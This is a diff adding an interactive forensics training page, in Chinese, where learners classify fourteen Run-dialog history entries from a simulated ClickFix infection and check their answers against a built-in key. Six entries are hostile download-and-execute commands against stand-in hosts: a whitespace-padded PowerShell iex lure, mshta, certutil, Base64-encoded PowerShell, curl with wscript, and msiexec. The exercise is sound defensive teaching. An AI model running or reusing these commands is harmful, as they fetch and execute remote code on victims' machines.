@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RunMRU 鑑識實驗 — ClickFix 判讀</title>
+<style>
+  :root{
+    --face:#ECE9E1;      /* Win32 對話框底色 */
+    --face-hi:#FFFFFF;
+    --face-lo:#9A958A;
+    --face-lo2:#6E6A61;
+    --pane:#FFFFFF;
+    --select:#10306B;
+    --ink:#1B1A17;
+    --ink-soft:#5A554B;
+    --tag-flag:#8C1D18;   /* 證物標籤・可疑 */
+    --tag-clear:#1F5D3F;  /* 證物標籤・正常 */
+    --reveal:#B0730F;     /* 空白字元顯影 */
+    --reveal-bg:#FBF1DC;
+    --ui:Tahoma,Verdana,"Noto Sans TC","PingFang TC","Microsoft JhengHei",sans-serif;
+    --mono:Consolas,"Courier New","Noto Sans Mono CJK TC",monospace;
+    --doc:Georgia,"Songti TC","Noto Serif TC",serif;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;padding:18px;background:#7A8393;
+    background-image:linear-gradient(180deg,#7A8393,#5E6675);
+    font-family:var(--ui);color:var(--ink);font-size:13px;line-height:1.5;
+  }
+  .wrap{max-width:1040px;margin:0 auto}
+
+  /* ---- 證物抬頭：檔案標籤風格 ---- */
+  header.evidence{
+    background:var(--tag-flag);color:#F7EFE6;padding:14px 18px;
+    border:2px solid #5D120F;
+    display:flex;flex-wrap:wrap;gap:6px 26px;align-items:baseline;
+  }
+  header.evidence h1{
+    font-family:var(--doc);font-size:17px;font-weight:400;margin:0;
+    letter-spacing:.02em;
+  }
+  header.evidence .meta{font-family:var(--mono);font-size:11px;opacity:.85}
+  header.evidence .meta b{font-weight:400;color:#F0C9C0}
+
+  /* ---- Win32 立體邊框 ---- */
+  .bevel-out{border-top:2px solid var(--face-hi);border-left:2px solid var(--face-hi);
+             border-right:2px solid var(--face-lo2);border-bottom:2px solid var(--face-lo2)}
+  .bevel-in{border-top:2px solid var(--face-lo2);border-left:2px solid var(--face-lo2);
+            border-right:2px solid var(--face-hi);border-bottom:2px solid var(--face-hi)}
+
+  .regedit{background:var(--face);padding:3px;margin-top:14px}
+  .titlebar{
+    background:linear-gradient(90deg,var(--select),#3B5C9E);color:#fff;
+    padding:3px 6px;font-size:12px;display:flex;justify-content:space-between;align-items:center;
+  }
+  .titlebar .btns{font-family:var(--mono);letter-spacing:2px;opacity:.9}
+  .menubar{padding:3px 6px;font-size:12px;color:var(--ink-soft);border-bottom:1px solid var(--face-lo)}
+  .menubar span{margin-right:14px}
+  .menubar u{text-decoration:underline}
+
+  .panes{display:grid;grid-template-columns:242px 1fr;gap:3px;padding:3px}
+  .tree,.values{background:var(--pane);overflow:auto}
+  .tree{padding:6px 4px;font-size:12px;min-height:300px}
+  .tree ul{list-style:none;margin:0;padding-left:14px}
+  .tree li{padding:1px 0;white-space:nowrap}
+  .tree .node{cursor:default;padding:0 3px}
+  .tree .node.here{background:var(--select);color:#fff}
+  .tree .twist{color:var(--ink-soft);display:inline-block;width:11px}
+
+  table.vals{border-collapse:collapse;width:100%;font-size:12px;table-layout:fixed}
+  table.vals th{
+    background:var(--face);font-weight:400;text-align:left;padding:3px 7px;
+    border-right:1px solid var(--face-lo);border-bottom:1px solid var(--face-lo);
+    position:sticky;top:0;z-index:2;
+  }
+  table.vals td{padding:2px 7px;border-bottom:1px solid #F0F0F0;vertical-align:top}
+  table.vals tr.row{cursor:pointer}
+  table.vals tr.row:hover td{background:#EEF3FB}
+  table.vals tr.row.sel td{background:var(--select);color:#fff}
+  table.vals tr.row.sel td .dim{color:#B9C6E3}
+  td.name{white-space:nowrap;font-family:var(--mono)}
+  td.data{font-family:var(--mono);max-width:1px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  td.rank{text-align:right;color:var(--ink-soft);font-family:var(--mono);width:34px}
+  .ab{color:var(--ink-soft);margin-right:4px}
+
+  /* ---- 證物標籤 ---- */
+  .tag{display:inline-block;font-size:10px;padding:0 5px;margin-left:6px;
+       border-radius:1px;color:#fff;font-family:var(--ui);vertical-align:1px}
+  .tag.f{background:var(--tag-flag)}
+  .tag.c{background:var(--tag-clear)}
+
+  /* ---- 工具列 ---- */
+  .toolbar{padding:6px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;
+           border-top:1px solid var(--face-lo)}
+  button{
+    font-family:var(--ui);font-size:12px;padding:4px 12px;background:var(--face);
+    border-top:2px solid var(--face-hi);border-left:2px solid var(--face-hi);
+    border-right:2px solid var(--face-lo2);border-bottom:2px solid var(--face-lo2);
+    cursor:pointer;color:var(--ink);
+  }
+  button:active{border-top-color:var(--face-lo2);border-left-color:var(--face-lo2);
+                border-right-color:var(--face-hi);border-bottom-color:var(--face-hi)}
+  button:focus-visible{outline:2px dotted var(--ink);outline-offset:-6px}
+  button[disabled]{color:var(--face-lo);cursor:default}
+  button.flag{background:#F3DEDC}
+  button.clear{background:#DDEAE1}
+  .spacer{flex:1}
+  .hint{font-size:11px;color:var(--ink-soft)}
+
+  /* ---- 編輯字串對話框（招牌元件） ---- */
+  .modal-bg{position:fixed;inset:0;background:rgba(20,22,28,.45);display:none;
+            align-items:center;justify-content:center;padding:16px;z-index:20}
+  .modal-bg.open{display:flex}
+  .dlg{background:var(--face);padding:3px;width:min(680px,100%);max-height:90vh;overflow:auto}
+  .dlg .titlebar{margin-bottom:0}
+  .dlg-body{padding:12px 14px}
+  .fld-label{font-size:12px;margin:8px 0 3px}
+  .fld{background:var(--pane);padding:5px 7px;font-family:var(--mono);font-size:12px;
+       word-break:break-all;white-space:pre-wrap;max-height:190px;overflow:auto}
+  .ws{color:var(--reveal);background:var(--reveal-bg)}
+  .decoded{background:#F4F7F2;border-left:3px solid var(--tag-clear);padding:6px 9px;
+           font-family:var(--mono);font-size:12px;margin-top:4px;word-break:break-all;display:none}
+  .decoded.show{display:block}
+
+  /* ---- 模擬「執行」對話框 ---- */
+  .rundlg{background:var(--face);padding:10px 12px;margin-top:12px}
+  .rundlg .cap{font-size:11px;color:var(--ink-soft);margin-bottom:6px;font-family:var(--doc);font-style:italic}
+  .runrow{display:flex;gap:6px;align-items:center}
+  .runrow .lbl{font-size:12px}
+  .runbox{flex:1;background:var(--pane);padding:3px 5px;font-family:var(--mono);font-size:12px;
+          white-space:nowrap;overflow:hidden;text-overflow:clip}
+  .caret{display:inline-block;width:1px;background:var(--ink);animation:blink 1.1s steps(1) infinite}
+  @keyframes blink{50%{opacity:0}}
+
+  /* ---- 案件筆記 ---- */
+  .report{background:#FBFAF6;margin-top:14px;padding:16px 20px;font-family:var(--doc);font-size:13.5px;line-height:1.65}
+  .report h2{font-size:15px;font-weight:400;margin:0 0 8px;letter-spacing:.03em;
+             border-bottom:1px solid var(--face-lo);padding-bottom:5px}
+  .report p{margin:0 0 9px}
+  .report ol{margin:0;padding-left:20px}
+  .report li{margin-bottom:6px}
+  .report code{font-family:var(--mono);font-size:12px;background:var(--face);padding:0 3px}
+  .score{font-family:var(--mono);font-size:12px;background:var(--face);padding:9px 12px;margin-top:10px;white-space:pre-wrap}
+  .verdict{display:none;margin-top:12px;border-top:1px dashed var(--face-lo);padding-top:12px}
+  .verdict.show{display:block}
+  .vrow{display:flex;gap:9px;padding:4px 0;border-bottom:1px solid #EFEDE6;align-items:baseline}
+  .vrow .vk{font-family:var(--mono);font-size:12px;min-width:22px}
+  .vrow .vv{font-size:12.5px}
+  .vrow.ok .vk{color:var(--tag-clear)}
+  .vrow.no .vk{color:var(--tag-flag)}
+
+  footer{color:#DDE1E8;font-size:11px;margin-top:14px;text-align:center;line-height:1.7}
+  footer b{color:#fff;font-weight:400}
+
+  @media (max-width:760px){
+    body{padding:8px}
+    .panes{grid-template-columns:1fr}
+    .tree{min-height:0;max-height:130px}
+    td.rank{display:none}
+    th.rank{display:none}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none!important;transition:none!important}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="evidence">
+    <h1>證物 EV-2026-0311-04 — Run 對話框歷史紀錄</h1>
+    <div class="meta">
+      主機 <b>WKS-TPE-1147</b> ・ 使用者 <b>c.lin</b> ・
+      取像 <b>2026-03-11 15:02 UTC</b> ・ 鍵值最後寫入 <b>2026-03-11 14:23:07 UTC</b>
+    </div>
+  </header>
+
+  <div class="regedit bevel-out">
+    <div class="titlebar">
+      <span>登錄檔編輯程式 — 唯讀掛載 \\EV-2026-0311-04\C\Users\c.lin\NTUSER.DAT</span>
+      <span class="btns">_ □ ×</span>
+    </div>
+    <div class="menubar">
+      <span><u>檔</u>案</span><span><u>編</u>輯</span><span><u>檢</u>視</span>
+      <span><u>我</u>的最愛</span><span><u>說</u>明</span>
+    </div>
+
+    <div class="panes">
+      <div class="tree bevel-in" aria-label="登錄檔路徑">
+        <ul>
+          <li><span class="twist">−</span>電腦
+            <ul>
+              <li><span class="twist">−</span>HKEY_CURRENT_USER
+                <ul>
+                  <li><span class="twist">−</span>Software
+                    <ul><li><span class="twist">−</span>Microsoft
+                      <ul><li><span class="twist">−</span>Windows
+                        <ul><li><span class="twist">−</span>CurrentVersion
+                          <ul><li><span class="twist">−</span>Explorer
+                            <ul>
+                              <li><span class="twist"> </span>RecentDocs</li>
+                              <li><span class="twist"> </span><span class="node here">RunMRU</span></li>
+                              <li><span class="twist"> </span>TypedPaths</li>
+                              <li><span class="twist"> </span>UserAssist</li>
+                            </ul>
+                          </li></ul>
+                        </li></ul>
+                      </li></ul>
+                    </li></ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+
+      <div class="values bevel-in">
+        <table class="vals">
+          <thead><tr>
+            <th style="width:78px">名稱</th>
+            <th class="rank" style="width:40px">序</th>
+            <th>資料</th>
+          </tr></thead>
+          <tbody id="rows"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="toolbar">
+      <button id="btnSort">依 MRUList 排序</button>
+      <button id="btnOpen" disabled>檢視完整字串</button>
+      <span class="spacer"></span>
+      <button id="btnFlag" class="flag" disabled>標記為可疑</button>
+      <button id="btnClear" class="clear" disabled>標記為正常</button>
+      <button id="btnCheck">檢查作答</button>
+    </div>
+    <div class="toolbar" style="border-top:0;padding-top:0">
+      <span class="hint" id="hint">點選一列查看資料。regedit 預設以名稱排序，真正的先後順序寫在 MRUList。</span>
+    </div>
+  </div>
+
+  <div class="report">
+    <h2>案情</h2>
+    <p>使用者 c.lin 回報：瀏覽一個影片網站時跳出「請完成人機驗證」的頁面，指示她按下 Win+R、貼上剪貼簿內容再按 Enter。她照做了，但覺得「什麼都沒發生」，所以沒有通報，直到三天後 EDR 對該主機發出告警。</p>
+    <p>你手上只有這支登錄檔的 RunMRU。這個鍵值會記下每一條使用者在「執行」對話框輸入或貼上的命令，每筆結尾固定是 <code>\1</code>。</p>
+    <h2>你的任務</h2>
+    <ol>
+      <li>逐筆判讀 14 條紀錄，替每一筆標記「可疑」或「正常」。</li>
+      <li>用 MRUList 還原真正的時間順序，找出這串攻擊的<em>第一條</em>命令。</li>
+      <li>其中一筆的資料欄看起來被截斷了。打開它，找出被藏起來的部分，並說明受害者當下在「執行」對話框裡究竟看到什麼。</li>
+      <li>另有一筆經過編碼。解出來，寫下它實際連往哪裡。</li>
+    </ol>
+    <div class="score" id="score">已標記 0 / 14　　可疑 0　　正常 0</div>
+    <div class="verdict" id="verdict"></div>
+  </div>
+
+  <footer>
+    <b>合成資料，僅供教學。</b>所有主機名稱皆為 RFC 2606 / RFC 6761 保留網域，不存在也無法連線；此頁面不執行任何命令，也不會對外發出任何請求。
+  </footer>
+</div>
+
+<!-- 招牌元件：編輯字串對話框 -->
+<div class="modal-bg" id="modal" role="dialog" aria-modal="true" aria-labelledby="dlgTitle">
+  <div class="dlg bevel-out">
+    <div class="titlebar">
+      <span id="dlgTitle">編輯字串</span>
+      <span class="btns"><button id="btnX" style="padding:0 7px;font-size:11px">×</button></span>
+    </div>
+    <div class="dlg-body">
+      <div class="fld-label">數值名稱：</div>
+      <div class="fld bevel-in" id="dlgName"></div>
+      <div class="fld-label">數值資料：</div>
+      <div class="fld bevel-in" id="dlgData"></div>
+
+      <div class="toolbar" style="padding-left:0;border-top:0">
+        <button id="btnWs">顯示空白字元</button>
+        <button id="btnB64">解碼 Base64</button>
+        <span class="hint" id="dlgLen"></span>
+      </div>
+      <div class="decoded" id="dlgDecoded"></div>
+
+      <div class="rundlg bevel-in">
+        <div class="cap">受害者當下在「執行」對話框裡看到的畫面（欄位寬度約 48 字元）</div>
+        <div class="runrow">
+          <span class="lbl">開啟(<u>O</u>)：</span>
+          <div class="runbox bevel-in" id="runBox"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  var PAD = new Array(181).join(" ");
+  var B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0"
+          + "ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4A"
+          + "LQB2AGUAcgBpAGYAeQAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMAMgAuAHAAcwAxACcAKQA=";
+
+  var DATA = {
+    a:"cmd",
+    b:"\\\\FS01\\HR\\Onboarding",
+    c:"notepad",
+    d:"mstsc",
+    e:'powershell -w hidden -nop -ep bypass -c "iwr http://cdn-verify.example.com/fix.ps1 -UseBasicParsing|iex"'
+      + PAD + "# \u2705 \u9a57\u8b49 ID: 8f2c-1a9d-7b4e \u2014 \u8acb\u52ff\u95dc\u9589\u6b64\u8996\u7a97",
+    f:"services.msc",
+    g:"mshta http://update.example.net/captcha-verify.hta",
+    h:"certutil -urlcache -split -f http://static.example.org/banner.png %APPDATA%\\banner.png",
+    i:"excel",
+    j:"powershell -enc " + B64,
+    k:"\\\\FS01\\Share\\Finance\\Q3",
+    l:"curl.exe -s -o %TEMP%\\vfy.js http://download.example.com/vfy.js & wscript %TEMP%\\vfy.js",
+    m:"winver",
+    n:"msiexec /q /i http://cdn-verify.example.com/update.msi"
+  };
+  var MRULIST = "jclhngemadbfik";
+
+  // 解答：可疑者的理由
+  var KEY = {
+    e:{bad:true, why:"ClickFix 本體。180 個空白把假的「驗證 ID」推到視野外，隱藏視窗 + 略過執行原則 + 下載後直接 iex。"},
+    g:{bad:true, why:"mshta 直接執行遠端 .hta（T1218.005），而且檔名還叫 captcha-verify。"},
+    h:{bad:true, why:"certutil -urlcache 當下載器用，副檔名偽裝成 .png 落地到 %APPDATA%（T1105）。"},
+    j:{bad:true, why:"Base64 編碼的 PowerShell，解出來是 DownloadString + IEX 的記憶體執行。"},
+    l:{bad:true, why:"curl 下載 .js 到 %TEMP% 後用 wscript 執行，一行內完成下載加執行。"},
+    n:{bad:true, why:"msiexec 從 URL 靜默安裝套件（T1218.007），/q 讓使用者看不到任何介面。"},
+    a:{bad:false,why:"開命令提示字元，日常操作。"},
+    b:{bad:false,why:"內部檔案伺服器 UNC 路徑。"},
+    c:{bad:false,why:"記事本。"},
+    d:{bad:false,why:"遠端桌面連線。"},
+    f:{bad:false,why:"服務管理主控台。"},
+    i:{bad:false,why:"Excel。"},
+    k:{bad:false,why:"內部檔案伺服器 UNC 路徑。"},
+    m:{bad:false,why:"顯示 Windows 版本資訊。"}
+  };
+
+  var marks = {};        // {a:"f"|"c"}
+  var sel = null;
+  var sortMru = false;
+  var wsOn = false;
+
+  var $ = function(id){ return document.getElementById(id); };
+  function esc(s){
+    return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  }
+
+  function order(){
+    var keys = Object.keys(DATA).sort();
+    if(!sortMru) return keys;
+    var out = [];
+    MRULIST.split("").forEach(function(c){ if(DATA[c] && out.indexOf(c)<0) out.push(c); });
+    keys.forEach(function(k){ if(out.indexOf(k)<0) out.push(k); });
+    return out;
+  }
+
+  function render(){
+    var tb = $("rows");
+    tb.innerHTML = "";
+    order().forEach(function(k){
+      var tr = document.createElement("tr");
+      tr.className = "row" + (sel===k ? " sel" : "");
+      tr.tabIndex = 0;
+      tr.setAttribute("data-k", k);
+      var rank = MRULIST.indexOf(k) + 1;
+      var tag = marks[k] === "f" ? '<span class="tag f">可疑</span>'
+              : marks[k] === "c" ? '<span class="tag c">正常</span>' : "";
+      tr.innerHTML =
+        '<td class="name"><span class="ab">ab</span>' + k + tag + '</td>' +
+        '<td class="rank">' + rank + '</td>' +
+        '<td class="data">' + esc(DATA[k] + "\\1") + '</td>';
+      tb.appendChild(tr);
+    });
+    // MRUList 自己也是一筆值，照實顯示
+    var tr = document.createElement("tr");
+    tr.innerHTML = '<td class="name"><span class="ab">ab</span>MRUList</td>' +
+                   '<td class="rank"></td><td class="data">' + MRULIST + '</td>';
+    tr.style.color = "#5A554B";
+    $("rows").appendChild(tr);
+
+    var n = Object.keys(marks).length;
+    var f = 0, c = 0;
+    Object.keys(marks).forEach(function(k){ marks[k]==="f" ? f++ : c++; });
+    $("score").textContent = "已標記 " + n + " / 14　　可疑 " + f + "　　正常 " + c;
+
+    ["btnOpen","btnFlag","btnClear"].forEach(function(id){ $(id).disabled = !sel; });
+  }
+
+  function select(k){
+    sel = k;
+    render();
+    $("hint").textContent = "已選取 " + k + "。資料欄放不下的內容不會消失 —— 用「檢視完整字串」把它整條打開。";
+  }
+
+  $("rows").addEventListener("click", function(e){
+    var tr = e.target.closest("tr[data-k]");
+    if(tr) select(tr.getAttribute("data-k"));
+  });
+  $("rows").addEventListener("dblclick", function(e){
+    var tr = e.target.closest("tr[data-k]");
+    if(tr){ select(tr.getAttribute("data-k")); openDlg(); }
+  });
+  $("rows").addEventListener("keydown", function(e){
+    var tr = e.target.closest("tr[data-k]");
+    if(tr && (e.key === "Enter" || e.key === " ")){
+      e.preventDefault(); select(tr.getAttribute("data-k")); openDlg();
+    }
+  });
+
+  $("btnSort").addEventListener("click", function(){
+    sortMru = !sortMru;
+    this.textContent = sortMru ? "依名稱排序" : "依 MRUList 排序";
+    $("hint").textContent = sortMru
+      ? "現在是真正的使用順序：第 1 筆最新。鍵值的最後寫入時間只對應第 1 筆，其餘各筆沒有各自的時戳。"
+      : "regedit 預設以名稱排序，真正的先後順序寫在 MRUList。";
+    render();
+  });
+  $("btnFlag").addEventListener("click", function(){ marks[sel]="f"; render(); });
+  $("btnClear").addEventListener("click", function(){ marks[sel]="c"; render(); });
+
+  // ---- 對話框 ----
+  function openDlg(){
+    if(!sel) return;
+    wsOn = false;
+    var v = DATA[sel] + "\\1";
+    $("dlgName").textContent = sel;
+    $("dlgDecoded").className = "decoded";
+    $("btnWs").textContent = "顯示空白字元";
+    $("btnB64").disabled = !/-enc\s+[A-Za-z0-9+/=]{20,}/.test(v);
+    $("dlgLen").textContent = "字串長度 " + v.length + " 字元";
+    paintData();
+    $("runBox").innerHTML = esc(DATA[sel].slice(0, 48)) + '<span class="caret">&nbsp;</span>';
+    $("modal").classList.add("open");
+    $("btnX").focus();
+  }
+  function paintData(){
+    var v = DATA[sel] + "\\1";
+    $("dlgData").innerHTML = wsOn
+      ? esc(v).replace(/ /g, '<span class="ws">\u00B7</span>')
+      : esc(v);
+  }
+  function closeDlg(){ $("modal").classList.remove("open"); }
+
+  $("btnOpen").addEventListener("click", openDlg);
+  $("btnX").addEventListener("click", closeDlg);
+  $("modal").addEventListener("click", function(e){ if(e.target === this) closeDlg(); });
+  document.addEventListener("keydown", function(e){ if(e.key === "Escape") closeDlg(); });
+
+  $("btnWs").addEventListener("click", function(){
+    wsOn = !wsOn;
+    this.textContent = wsOn ? "隱藏空白字元" : "顯示空白字元";
+    paintData();
+  });
+
+  $("btnB64").addEventListener("click", function(){
+    var m = (DATA[sel]||"").match(/-enc\s+([A-Za-z0-9+/=]{20,})/);
+    if(!m) return;
+    var bin = atob(m[1]), out = "";
+    for(var i = 0; i < bin.length; i += 2){          // PowerShell -enc 用 UTF-16LE
+      out += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i+1) << 8));
+    }
+    $("dlgDecoded").textContent = "解碼結果（UTF-16LE）：" + out;
+    $("dlgDecoded").className = "decoded show";
+  });
+
+  // ---- 對答案 ----
+  $("btnCheck").addEventListener("click", function(){
+    var v = $("verdict"), html = "", right = 0, done = 0;
+    order().forEach(function(k){
+      var mine = marks[k];
+      if(mine) done++;
+      var truth = KEY[k].bad ? "f" : "c";
+      var ok = mine === truth;
+      if(ok) right++;
+      var label = mine ? (ok ? "✓" : "✗") : "–";
+      html += '<div class="vrow ' + (ok ? "ok" : (mine ? "no" : "")) + '">'
+            + '<span class="vk">' + label + " " + k + '</span>'
+            + '<span class="vv"><b>' + (KEY[k].bad ? "可疑" : "正常") + '</b> — ' + esc(KEY[k].why) + '</span></div>';
+    });
+    var head = "<p><b>" + right + " / 14 正確</b>（已作答 " + done + " 筆）。這台主機共有 6 筆惡意紀錄，"
+             + "全部落在 MRUList 的前 7 名之內。攻擊鏈最早的一筆是 <code>e</code>，也就是 ClickFix 誘餌本體；"
+             + "其餘 5 筆都是它之後才出現的後續階段，最新的是 <code>j</code>。</p>";
+    v.innerHTML = "<h2>判讀對照</h2>" + head + html;
+    v.className = "verdict show";
+    v.scrollIntoView({behavior: "smooth", block: "nearest"});
+  });
+
+  render();
+})();
+</script>
+</body>
+</html>
